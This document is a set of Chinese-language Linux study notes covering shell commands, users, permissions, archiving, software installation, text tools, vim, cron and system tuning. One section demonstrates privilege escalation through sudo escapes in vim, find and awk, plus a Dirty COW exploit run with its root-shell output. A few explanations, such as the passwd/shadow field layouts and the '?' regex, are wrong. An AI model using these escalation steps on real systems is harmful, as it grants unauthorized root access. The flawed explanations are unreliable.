
# Linux



## SSH远程登陆/重启

```shell
#远程登陆Linux
ssh root@192.168.109.134
#断开连接
exit/logout
#重启系统
reboot/shutdown -r now/init 6
#关机
shutdown -h now/init 0
#十分钟后关机
shutdown -h 10
```

## 常用简单指令

```shell
clear #用于清除终端上的所有内容，只留下一行提示符
touch test{1..10}.txt #批量创建文件touch test{a..f}.txt
touch /root/4.txt #在指定的/root目录下，创建文件4.txt
# 如果touch的文件名称重复了，不会覆盖原文件
ls
ls -al
ls -alh
ll
mv 123.txt /opt
cp -a dev04 /opt/
rm -rf dev01
mkdir dev{01..10} #批量创建多个目录
mkdir -p 1/2/3/4/5/6 #一次性创建多级子目录
cd -
cat/tac
cat -n jaden.txt # 显示内容的同时，显示行号
head -n 5 test03.txt #查看文件的前5行
tail -n 5 test03.txt
```
---

```shell
ip addr|tail -4
ip addr|tail -4|head -1
wc #全称Word Count,计数,比如统计文件有多少个字节多少行等等
cat test.txt |wc -l #按行统计
wc -c test.txt # 统计文件中有多少个字节
seq # 全称：sequence，序列的意思
seq -w 5 12 #产生一个5到12等宽的序列
sort # 默认排序，先数字后字母
sort -n # 先字母(先小写字母后大写字母)后数字的排序方式，sort -n -r 反向排序
uniq #全称：unique，唯一、去重的意思，但是它是将连续的去重，不会间隔去重，所以最好先排序再去重
cat test02.txt|sort -n|uniq
cat test02.txt|sort -n|uniq -c # -c显示重复次数


history !number !mv
history -c # 这是清除内存中的历史指令
删除主文件夹下面.bash_history # 这是清除硬盘中的历史指令，内存中的指令会自动备份到.bash_history中，但是有个延迟，退出登录之后，才会将历史指令同步到硬盘文件中
#每个用户家目录下都有一个.bash_history默认记录最近的1000条指令，通过echo $HISTSIZE可以查看，可以配置的更大或者更小一些，vi /etc/profile

alias
vi .bashrc
#空白处，增加一行
alias cip='ip addr|tail -4|head -1'

```



```shell
stat 1.txt #查看文件状态
file #查看文件类型
find #文件查找
find   /etc   -maxdepth 1  -type f  -name "pa*"
命令   目录...   查找深度     类型   文件名称包含
# -type文件类型：f表示文件，不指定类型的话，文件和目录都会查找
# -maxdepth查找深度：目录层级的意思，不指定的话，就按照最大深度来查找 
# "pa*"： *表示匹配任意pa开头的内容，*号还可以写在开头
find / -type f -size +100M
find /root/nginx-1.20.2 -type f -size -2k
find /  -type f   -size +50M  -and -size -100M 
find /etc -maxdepth 1  -iname "pa*"  # i是ignore的简写，忽略的意思
时间参数：atime mtime ctime amin mmin cmin  #(time是按照天来查找，min是按分钟查找)
find /opt -type f -mtime -1   #-1代表一天以内，+1一天以前
find /root -type f -mmin -20
find /etc/ -type f -mtime +1 -and -mtime -10
find /root -type f ! -name "*.txt" # 找名称中不是.txt结尾的文件
find /root ! -type f  # 找文件夹
find / -user jaden  # 查找属于jaden用户的所有目录和文件
find / -group jaden
#对找出的文件进行处理 格式：正常的find语句+操作exec
find /tmp -type f -size +10K -exec rm rf {} \;
# {}表示我们找到的那些文件，正常exec语句最后要分号结尾，但是分号在linux中有特殊的意义，比如一次性执行两个指令可以 ls -lh;id，这样执行，所以要对;进行转义，意思是不要将;作为shell指令的分隔符，\就是转义号。
find /tmp -name "vm*" -exec rm -rf {} \;
find /root -type f -mmin -30  ! -name ".*"  -exec rm {} \;
find /root  -maxdepth 1  -type d  -name "Apa*"   -mmin -30 -exec cp -a {} /tmp \;

which pwd #得到可执行程序的位置
whereis pwd #可得到可执行程序的位置和手册页的位置
```



## 用户/用户组管理

```shell
useradd test1 #创建用户
useradd -g test1 test3 #-g 是指定主组，指定组来创建用户，如果没有指定组，那么创建用户的时候，linux会自动创建一个与用户名同名的组。
passwd test1 #指定用户设置密码，远程ssh连接是需要密码的，所以想让某个用户登录系统，必须设置密码
passwd # 给当前登录用户修改密码，root用户修改密码不需要输入旧密码，普通用户需要输入旧密码
echo 123456|passwd --stdin test1 #免交互修改密码，这样不需要输入两次密码确认。echo是打印的意思，有结果输出给passwd命令来修改test1用户的密码
id test1 #检查用户是否存在
userdel test1 #删除用户
userdel -r test1 # 删除用户，并删除用户相关目录
linux删除用户之后，/home/目录下对应的用户文件夹还在，如果还想加回来这个用户，那么会提示家目录存在，不会从样板目录(skel)中复制任何文件了，通过ls -a /etc/skel，可以看到skel目录下的内容了。还提示邮箱文件已经存在，ls /var/spool/mail下面

usermod -L test1 #锁定用户，被锁定的用户，下次就登录不上系统了。
usermod -U test1 #解锁用户
usermod -s /sbin/nologin test2 #禁止用户登录
usermod -g 组名 # 修改用户所属的主组
usermod -g test aaa #将aaa用户的主组改为test
usermod -G # 将用户添加到多个其他组中
lchage -l test1 # 查看用户详细信息

#所有的用户信息存储在/etc/passwd文件中，每创建一个用户该文件就会多一行记录，可以通过该文件查看自己注册了几个用户。登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志
cat /etc/passwd
#所有的用户密码信息存储/etc/shadow，设置了密码的长度比较长。密码是两层加密的，基本无法破解。用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell
cat /etc/shadow

w #查看当前登录了几个用户，或者打开了几个终端
16:27:57 up  1:00,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    192.168.109.1    15:38    5.00s  0.02s  0.00s w
# tty1表示本地登录的、pts/0表示远程登录的
```

```shell
groupadd test
cat /etc/group # 查看有哪些组
groupdel test #如果组内有用户，会报错，需要先删除主组属于这个组的所有用户(userdel -r 用户名)，或者将用户移到其他的组之后在删除组。
groupdel 组名 删除组 如果组内有用户会报错需要先去除组内所有用户
-n修改组名，被修改的名字写最后	-g修改主组	-G将用户添加到某个组
groupmod -n jaden wulaoban # 修改组名

```





## 权限管理

### 文件/文件夹管理

```shell
chomd -r,就是去掉r权限，chomd +r就是加上读权限，chmod +wr就是加读写权限，chmod
u+r，就是给文件属主用户添加读权限等
chown test2:test2 ls #修改文件的所属,普通用户是不能修改其他用户文件的所属的，需要root用户，所以先切换到root用户来操作
chown test1 test
chown 1001:1001 test1.txt

文件属性的.表示开启selinux的状态下创建的
sestatus # 查看状态
vi /etc/selinux/config
#把7行改为： SELINUX=disabled 然后保存退出，并且重启系统才会生效。然后再登录创建文件，查看文件信息，就看不到.了


```

###  环境变量

```shell
env
echo $PATH # 下面这几个就是环境变量路径存放位置
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
export用来声明环境 变量、修改环境变量等
export LANG=en_US.UTF-8
```

### suid/sgid/sticky

```
suid sgid sticky
```



## Linux Shell

```shell
# 在/etc/passwd中可以看到：
wangwu:x:1002:1002::/home/wangwu:/bin/bash
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
# 如果指定的是/sbin/nologin这个shell的话，是没有办法登录系统的
shell会帮我们检测输入和输出的内容是否正确，shell是一个帮助寻找输入指令的程序
```

如果你发现xshell或者ssh指令连接linux系统的时候很慢，等好久才连接成功，那么就可以按照下面的方式优化一下

```shell
cp /etc/ssh/sshd_config /tmp/ #修改配置文件，先备份
vi /etc/ssh/sshd_config
#直接输入:79回车
79 GSSAPIAuthentication no
115 UseDNS no
输入:wq保存退出
systemctl restart sshd #重启sshd服务
```

### shell提示符

```shell
[用户名@主机名 所在目录]
[root@localhost ~]
hostname #查看主机名
hostnamectl #查看主机信息

#临时修改主机名 需要重新登录生效
hostname jaden #修改主机名
#永久修改主机名 需要重新登录生效
hostnamectl set-hostname test


echo $PS1 #显示当前格式 \u是用户，\h是主机名，\W是相对路径
# 临时修改：重新登录就又还原了
cd /usr/local/bin/
export PS1='[\u@\h \w]\$' #小写w是绝对路径
#永久修改
vi .bashrc
#找个空白的地方，插入一行
export PS1='[\u@\h \t \w]\$'
#linux PS1可以各种定制：参考https://www.cnblogs.com/Q--T/p/5394993.html
```

### 快捷键

```
Ctrl + a #光标跳转至正在输入的命令行的首部
Ctrl + e #光标跳转至正在输入的命令行的尾部
Ctrl + c #终止前台运行的程序，比如ping指令
Ctrl + d #在shell中，ctrl-d表示推出当前shell。
Ctrl + z #将任务暂停，挂至后台, 执行fg命令继续运行
Ctrl + l #清屏，和clear命令等效。
Ctrl + k #删除从光标到行末的所有字符
Ctrl + u #删除从光标到行首的所有字符
Ctrl + r #搜索历史命令, 利用关键字搜索
ctrl + w #光标往前删除一个参数，以空格为分割
```



## Linux打包压缩

### tar

```shell
-c：表示创建用来生成文件包 #压缩
-x：表示提取，从文件包中提取文件 #解压
-t：可以查看压缩的文件。 
-z：使用 gzip 方式进行处理，它与”c“结合就表示压缩，与”x“结合就表示解压缩。 
-j：使用bzip2方式进行处理，它与”c“结合就表示压缩，与”x“结合就表示解压缩。 
-v：详细报告 tar处理的信息。 
-f：表示文件，后面接着一个文件名。 -C <指定目录> 解压到指定目录。
-C： 指定解压到哪个目录

压缩：tar -zcvf 压缩包路径 目标1 目标2 目标3 ...
解压：tar -zxvf 解压路径

tar cf #归档，但是不压缩

#gzip示例
tar czvf dira.tar.gz dira
tar tvf  dira.tar.gz #查看压缩包内容
tar xzvf dira.tar.gz -C /home/book #解压到/home/book
#bzip2示例
tar cjvf dira.tar.bz2 dira
tar tvf dira.tar.bz2 
tar xjvf dira.tar.bz2 -C /home/book
```

### gzip

```shell
#压缩文件会自动删除原文件tar会留着原文件,gzip只能压缩单个文件，不能压缩目录
-k在压缩或解压时，保留输入文件, -d解压缩, -l列出压缩文件内容
gzip -l  pwd.1.gz #查看压缩文件
gzip -kd pwd.1.gz
gzip -k mypwd.1 #压缩文件
```

### bzip2

```shell
同上#压缩文件会自动删除原文件tar会留着原文件,bizp2只能压缩单个文件，不能压缩目录
#一般情况下，小文件使用 gzip 来压缩，大文件使用 bzip2 来压缩。bzip2 的的压缩率更高
-k在压缩或解压时，保留输入文件 -d解压缩
bzip2 -k mypwd.1
bzip2 -kd mypwd.1.bz2
```



### zip

```shell
zip -r 1.zip services shike #会保留原文件

```

### rar

```
#解压rar包
#需要安装软件
yum install epel-release -y
yum install unar -y
#再进行解压
unar -o 解压路径 被解压文件路径
例如：
unar -o /opt 456.rar
```



## 文件传输/软件安装

```shell
curl -o 本地存放路径 文件网址
wget 文件网址
wget比curl方便不需要指定文件名，curl如果不指定文件名路径的话会将文件内容打印在屏幕上

#把本地文件推送到远程服务端
# 格式： scp 本地文件路径 远程主机用户@远程主机ip地址:远程主机某个目录
scp typora-setup-x64.exe root@10.0.0.128:/tmp
#把远端服务文件拉取到本地
# 格式：scp 远程主机用户@远程主机ip地址:远程主机某个文件路径 本地路径
scp root@10.0.0.128:/tmp/typora-setup-x64.exe .

rz #上传
sz #下载
```

### 编译安装

```shell
1.下载源码包
cd /opt/
rm -fr *
curl -o nginx.tar.gz http://nginx.org/download/nginx-1.20.1.tar.gz
2.编译安装
tar xf nginx.tar.gz 
cd nginx-1.20.1/
- 配置编译参数
# 这个软件给我们提供了很多功能，我们在编译的过程中可以自己选择哪些功能要，哪些功能不要，所有功能都要就是完整版，好多功能都不要就成了精简版，这里禁掉了一些功能，以为这些功能都需要好多依赖包就暂时先删除了。--without就是去掉的意思。--prefix=/usr/local/nginx是指定软件的安装目录，目录不存在的话会自动创建。./是用相对路径来执行这个configure文件，用绝对路径也可以执行这个文件。这个指令执行之后，会自动检查各种依赖环境是否满足软件运行的要求，检查通过之后会生成一个叫做Makefile的文件。
./configure --prefix=/usr/local/nginx --without-pcre --without- http_rewrite_module --without-http_gzip_module 
- 编译
make
#make会找当前目录中的Makefile文件来进行编译，这个编译过程一般是比较长的。到底多长时间 呢？1、看CPU性能  2、软件功能复杂度
./objs/nginx -v
到这里只是编译完了，还需要安装，其实安装就是将这个程序的某些文件放到对应的目录中去。其实在上面的编译参数中已经指定好了--prefix=/usr/local/nginx，要安到/usr/local/nginx目录中去。
3.安装
make install
4.运行
/usr/local/nginx/sbin/nginx
# 关闭防火墙，访问
systemctl stop firewalld
ip addr
```

### 打包压缩

```shell
/usr/local/nginx 这个目录就是编译好之后的整个软件的所有运行文件目录，打包它即可
cd /usr/local/
tar -zcf /tmp/nginx_jaden.tar.gz nginx 
ls /tmp/
# 推送给另外一台主机
scp nginx_jaden.tar.gz root@192.168.61.135:/tmp
# 另外一台主机的操作：解压到/usr/local目录下，然后运行
cd /tmp
mv nginx_jaden.tar.gz /usr/local/
tar -zxf nginx_jaden.tar.gz
/usr/local/nginx/sbin/nginx
systemctl stop firewalld
```

### rpm安装

```shell
#下载rpm安装包
curl -o wget.rpm https://buildlogs.centos.org/c7.00.02/tree/20140529193336/1.6.0-10.el7.x86_64/tree-1.6.0-10.el7.x86_64.rpm
#安装rpm包 #rpm -i是安装，vh是显示安装进度条的意思。
rpm -ivh tree-1.6.0-10.el7.x86_64.rpm
# 升级
rpm -Uvh tree-1.6.0-10.el7.x86_64.rpm
# 卸载
rpm -e tree
# 查看已安装的软件
rpm -qa|grep httpd
```

### yum安装

```shell
#自动解决rpm依赖 
#yum安装扩展yum仓库
yum install epel-release -y 
#yum安装nginx
yum install nginx -y 
#yum移除nginx
yum remove nginx -y 
#查看仓库rpm的数量
yum repolist
```

`编译安装：优点： 自由定制  痛点：难度高，步骤繁琐 
rpm安装：优点：安装简单   痛点：需要自己解决依赖，不支持定制 
yum安装：优点：自动解决依赖，默认安装最新版  痛点：不支持定制`

## linux运行级别和sudo

`运行级别 0 关机
运行级别 1 单用户 ，这个类似于windows安全模式，可以用于找回密码等操作。
运行级别 2 不带网络的多用户 ，这种是不能联网的。
运行级别 3 完整的多用户模式 multi-user.target ， 我们平常使用的模式
运行级别 4 保留
运行级别 5 桌面模式 graphical.target ， 桌面版系统就是这个模式，如果不想开机进入图形化界面，就需要修改运行级别，可以试一下`
`运行级别6 重启
centos6是通过数字来设置，centos7都不是用数字了，而是用下面的方式，不过数字设置依然有效`

```shell
init+ 数字 #切换运行级别
runlevel/systemctl get-default #查看运行级别
systemctl set-default graphical.target #设置默认运行级别为图形(init 5)
systemctl set-default multi-user.target #设置默认运行级别为命令行(init 3)
```

单用户模式修改root登陆密码

> 进入单用户模式：将ro rhgb quiet改为rw init=/bin/bash，进入后输入passwd 用户名更改密码然后重启系统即可，单用户模式重启指令exec /bin/init

## 掩码

```shell
#修改文件vim /etc/profile，找到umask来修改
root 默认权限掩码 022
普通用户 默认权限掩码 002
# 文件权限计算：0666-0022 = 0644
# 目录权限计算：0777-0022 = 0755
. /etc/profile #修改后执行生效
```

## inode/block

```
df -h #查看硬盘空间
df -ih # 查看inode空间
```

## su/sudo

```shell
su 用户名
exit # 退出，又回到root用户了
```

sudo需要配置修改配置才能开启

```shell
配置/etc/sudoers  #root用户才能修改这个配置
visudo  #直接visudo就能编辑这个文件

#用户名 所有终端 = 运行的用户身份 命令
#在100行下面添加如下内容
jaden ALL=(ALL) /bin/systemctl,/usr/bin/vim,/usr/sbin/reboot
# 修改完配置文件，保存退出之后，立马就生效了，不需要重启或者重新登录

sudo -l #查看可以使用的授权命令
sudo reboot
sudo vim /etc/shadow# 注意，vim的权限很大，比如可以修改密码，可以修改授权配置文件等，甚至root用户的密码都可以修改，所以不要将vim的root权限给普通用户。
```

## Linux用户提权

### sudo提权

```shell
示例1：
vim # 命令模式执行: !/
# 通过vim修改/etc/sudoers，授权ALL
# 再通过vim进入一个文件
# :输入指令，是可以直接输入系统指令的，前面加一个!即可，比如创建一个文件，!touch 3.txt
# 查看3.txt信息如下
[jaden@localhost ~]$ ll
总用量 0
-rw-r--r-- 1 root root 0 3月 27 17:05 3.txt # 以root用户身份创建的文件
# 如果在vim文件时，执行!/bin/bash，就进入到了root的命令终端，可以为所欲为。
# 这就是sudo提权，但是sudo提权需要借助到可以执行系统指令的交互式的功能，比如vim。
示例2：
find # sudo find . -exec bash \; # 直接进入root的命令终端，这个指令退出root终端可能
要退好几次才行，看find找到了几个文件，找到了3个文件，就输入三次exit才能退出。
示例3：
awk # sudo awk 'BEGIN {system("/bin/bash")}' jaden.txt # 直接进入到root命令终
端，exit直接退出。
# 还有好多指令可以提权，比如cp命令也可以提权，将其他电脑上的/etc/shadow文件拷贝到这个系统中，
密码就改掉了，再su切换到root即可等等，还有什么mv、vi、sed修改文件、chmod改重要文件权限等等这
里就不多提了。大家可以试试，普通用户使用sudo来修改shadow文件的root用户的密码。
```

### 脏牛提权

> https://github.com/gbonacini/CVE-2016-5195
> github上对它有介绍，比如哪些版本的系统有这样的漏洞。要某个系统版本和gcc版本同时满足的时候才会有这个漏洞，我们的centos7.8虽然系统版本能对上，但是gcc版本高，对不上，所有没有这个漏洞，不能用这个程序提权

```shell
unzip CVE-2016-5195-master.zip
cd CVE-2016-5195-master/
make #编译
./dcow -s #提权
#提权成功如下
Running ...
Password overridden to: dirtyCowFun

Received su prompt (Last login: Sat Jan 31 15:39:05 CST 2026 from 192.168.109.1 on pts/0
)
dirtyCowFun
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
\cp /tmp/.ssh_bak /etc/passwd
\rm /tmp/.ssh_bak
[root@dms ~]# dirtyCowFun
-bash: dirtyCowFun: command not found
[root@dms ~]# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
[root@dms ~]# \cp /tmp/.ssh_bak /etc/passwd
[root@dms ~]# \rm /tmp/.ssh_bak

# 看内核版本，比如我们使用的
cat /etc/redhat-release
```





## grep/sed/awk

```shell
#擅长过滤，或者说查找，按行来过滤

#grep参数 
-n 显示行号  
    [root@localhost ~]# grep -n 'tcp' test.txt 
    # vi test.txt +48，表示进入vi的时候，光标直接定位的48行起始位置。
-c 对结果行计数 
    [root@localhost ~]# grep -c 'tcp' test.txt 
    14
-i 不区分大小写
    [root@localhost ~]# grep -n 'tcp' test.txt -i
-v 反向搜索，取反
    [root@localhost ~]# grep -n 'udp' test.txt -v # 将不含有udp的行全部过滤出来
-w 精准匹配
    [root@localhost ~]# grep -w 'tcp' test.txt 
-o 只显示匹配的结果，前面的第一个示例中我们用过-o参数 
    [root@localhost ~]# grep -o -n 'tcp' test.txt
-A1 同时打印搜索结果行的后一行 ，A是after的简写 
    [root@localhost ~]# grep -A2 'ftp' test.txt 
    [root@localhost ~]# grep -A 2 'ftp' test.txt 
-B3 同时打印搜索结果行的前三行，B是before的简写
    [root@localhost ~]# grep -B3 'ftp' test.txt 
-C2 同时打印搜索结果行的上下各两行
    [root@localhost ~]# grep -C2 'ftp' test.txt 
-E  扩展正则表达式
    # 正则我们下面会细讲，先简单了解一下。
    [root@localhost ~]# grep -E '.tp' test.txt  # .就是正则表达式，表示任意的一个字符 
    [root@localhost ~]# grep -E 'ftp|ssh' test.txt # 查找ftp或者ssh，|是或者的意思，
可以用多个ftp|ssh|telnet... 
-P  使用perl正则
    # perl语言中设计的正则表达式写法规则，很强大，很多领域都支持perl正则的语法结构。 
    [root@localhost ~]# grep -P "\d+" test.txt # 匹配所有的数字 
    [root@localhost ~]# grep -P "\d{4,}" test.txt  #匹配4位的数字
```



```shell
#擅长取行和修改替换
用法：sed [-nri] [动作]  目标文件文件
-n ：使用安静(silent)模式。在一般 sed 的用法中，所有数据一般都会被列出到终端上。但如果加上 -n 参数后，则只有经过sed 特殊处理的那一行(或者动作)才会被列出来。
-r ：sed 的动作支持的是延伸型正则表示法的语法。(默认是基础正则表示法语法)
-i ：直接修改读取的文件内容，而不是输出到终端。

动作
a ：指定行后面插入一行
d ：删除
i ：指定行前面插入一行
p ：打印，#一般和前面的-n参数一起用
s ：替换 需要I忽略大小写，全局替换需要g
sed '/a/p' 1.txt  #默认会将所有行都打印出来，并且匹配到的a所在的行重新打印一遍
sed -n '/a/p' 1.txt   # 加上-n，进入安静(silent)模式，就不会将所有内容打印出来了
sed -n '/tcp/p' test.txt  # 也能过滤出tcp所在的行
sed  '/tcp/d' test.txt # 删除所有带tcp的行，并不是删除原文件中的数据
sed  '/tcp/d' test.txt > 2.txt  # 所以只需要一个重定向，就拿到删除之后的结果了
sed -i '/tcp/d' test.txt # -i就可以直接删除原文件的数据
sed '/^#/d' test.txt # 删除以#开头的行
sed '1,10d' test.txt  # 删除1-10行的数据
sed -n '1,5p' test.txt # 只要1-5行的数据
sed '3a hello jaden' 1.txt # 在第三行后面插入一行数据

sed 's#3a#wuLAOBAN#' 1.txt # 把3a替换成wuLAOBAN
sed 's#A#xxx#' 1.txt#把A替换成xxx每行只替换一次，同一行第二个及之后的A都不进行替换
sed 's#A#xxx#g' 1.txt  # 把所有的A都替换成xxx
sed 's#A#xxx#gI' 1.txt# 把所有的A和a都替换成xxx，忽略大小写，参数I
```



```shell
#擅长取列
awk '{print $1}' 3.txt
awk '{print $1,$NF}' 3.txt  # 取第一列和最后一列
awk '{print $1,$2*$3}' 4.txt #可以用于做计算
awk 'NR<=3 && NR>1' 4.txt  # 取出行号大于1并且小于等于3的行
awk 'NR<=3{print $1}' 4.txt # 还可以取行的同时来取列
awk -F ":"  '{print $7,$1}' /etc/passwd  # 指定分隔符，默认是按照空格作为分隔符的这个文件都是用:做的分隔符
```



## 正则表达式

```shell
1) ^ 表示搜索以什么开头。
2) $ 表示搜索以什么结尾。
3) ^$ 表示空行，不是空格。
4) . 代表且只能代表任意一个字符。
5) \ 转义字符，让有着特殊身份意义的字符，脱掉马甲，还原原型。
例如：\.只表示小数点，还原原始小数点的意义。
6) * 重复0个或多个前面的一个字符。不代表所有了。
7) .* 匹配所有的字符。^.* 任意多个字符开头。
8) [abc] 匹配字符集合内任意一个字符[a-z]
9) [^abc] ^再中括号里面表示非，不包含a或b或c。
10) {n,m} 重复n到m次，前一个字符。
11） + 重复1次到多次
12） ？ 重复0次到多次
```



```shell
ip addr|grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'|sed -n '2p' grep 'Failed password' secure |grep -Eo '[0-9]{1,3}\.[0-9.]+' #取ip的例子

lastlog|sed -n '/root/p'|grep -Eo '[0-9]{2}:[0-9]{2}:[0-9]{2}' #取root用户登录时间
```

## vi/vim编辑器

```shell
hljk
ctrl+f下翻一页ctrl+b上翻一页ctrl+u上翻半页ctrl+d下翻半页
n<space>光标向后移动n个字符n<Enter>光标向下移动n行
w向前移动一个单词b向后移动一个单词0行首^行首第一个字符$行尾x向后删除一个字符
d1G删除光标所在到第一行的所有数据y1G复制游标所在行到第一行的所有数据.重复前一个动作
gg文首G文尾5gg/5G指定数字行5+下移n行5-上移n行:数字为移动到数字对应行数
x删除单个字符10x删除10个字符X删除光标前面的一个字符
cc删除整行，并且修改整行内容。dd 删除光标所在行(其实dd是剪切的操作),D删除至行尾
使用u撤销之前的操作，使用ctrl+r恢复 6dd 从光标开始往下删除6行 dw 删除一个单词(word)
小p 粘贴粘贴板的内容到当前a行的下面，比如将dd剪切的行黏贴到下面 大P 粘贴粘贴板的内容到当前行的上面
yy复制行 5yy复制5行，复制的内容可以通过大小写p来黏贴
/+要搜索的词,按n向下搜索，N向上搜索
{上一段(以空行为分隔 程序开发中通常以一段相关代码分割)
}下一段
%括号匹配及切换

|   命令   | 模式       | 功能                               |
| :------: | ---------- | ---------------------------------- |
|    v     | 可视模式   | 从光标位置开始按照正常模式选择文本 |
|    V     | 可视行模式 | 选中光标经过的完整行               |
| Ctrl + v | 可视块模式 | 垂直方向选中文本                   |
可视模式下，可以和移动命令连用，例如：`ggVG` 能够选中所有内容

:1369s/shell/jaden/g # 将第1369行的shell替换为jaden，斜杠/还可以用#或者@符号来
:1369,1379s/shell/jaden/g # 将1369至1379这10行中的shell替换为jaden
:1369,$s/shell/jaden/g # 将1369至文末中的shell替换为jaden
:%s/old/new/g #搜索整个文件，将所有的old替换为new
:%s/old/new/gc #搜索整个文件，将所有的old替换为new，每次都要你确认是否替换(y/n/a/..)，

vim /etc/vim/vimrc #编辑vim配置文件
set ts=4 #VI 编辑器默认TAB键为8空格 改成4空格
set nu #VIM编辑器默认是不显示行号的，不显示行号不利于代码查看，设置VIM编辑器显示行号
set noexpandtab #配置VIM编辑器使用空格代替TAB键

```





## 进程管理/定时任务/优化系统

### 进程管理

**查看和关闭进程**

```shell
ps -ef #查看进程
kill pid号 #关闭进程
kill -9  pid号  #慎用
pkill CMD命令名称 #批量关闭进程，pkill全称program kill
```

**查看计算机硬件信息**

```shell
lscpu #查看cpu
free -h #查看内存命令
df -h #查看硬盘命令-h表示人类可读
top #查看计算机的cpu，内存，进程等信息(和windows的任务管理器很像 按数字1，可以查看cpu数量)
```

### 定时任务

```shell
date #查看时间
date -d计算相对时间-s修改时间-u以utc时区显示时间s
date -s '20200723 14:40:00' #修改时间和日期
systemctl restart chronyd #同步时间，如果时间和当前时间不一致，可以做一下时间同步，来让时间准确起来

crontab -l #查看定时任务
crontab -e #编辑定时任务
# crontab -e里面每一行都可以写一个定时任务，也就是可以写多个定时任务。
systemctl restart crond #重启定时任务的进程
#定时任务的格式
*  *  * *  *    cmd 
分 时 日 月 周    命令
#定时任务的格式
*  *  * *  *    cmd 
分 时 日 月 周    命令 
分：0-59
时：0-23
日：0-31
月：1-12
周：1-7 
#每5分钟执行一次
*/5  *  * *  *

#每1小时的01分执行一次 
01 */1 * * *

#每半个小时执行一次，下面的意思是每小时的00分和30分各执行一次 
00,30  */1 * * *

#每天晚上8:00执行一次
00 20 * * * 
#每个月1号晚上8:00执行 
00 20 1 * * 
#每年1月1号晚上8:00执行 
00 20 1 1 *

#每周1、周三、周五晚上8:00执行一次 
00 20 * * 1,3,5

# 几个符号的意思： 
# * 每分钟
# */5 每5分钟
# 05 第5分钟
```

## 优化系统

```shell
1.优化ssh，以防连接过慢
vi /etc/ssh/sshd_config  # 改配置文件之前，最好先做好备份，cp /etc/ssh/sshd_config 
/etc/ssh/sshd_config.bak
79行：GSSAPIAuthentication no
115行：UseDNS no  # 别忘了删除前面的注释符号#
systemctl restart sshd

2.优化selinux
#修改配置文件，永久关闭
vi /etc/selinux/config
#第7行修改为
SELINUX=disabled
需要重启生效
#立即生效，临时的  #有时候有些服务器不让重启，就可以先这样临时用一下 
setenforce 0

3.关闭firewalld
systemctl stop firewalld 
systemctl disable firewalld

4.安装常用软件
yum install lrzsz vim tree wget net-tools screen bash-completion tcpdump -y
```

## 磁盘管理

```
fdisk
p 显示现有的分区 
n 建立新分区
t 更改分区类型
d 删除现有的分区
a 更改分区启动标志 
w 对分区的更改写入到硬盘或者存储器中。 
q 不保存退出

mkfs

mount

```


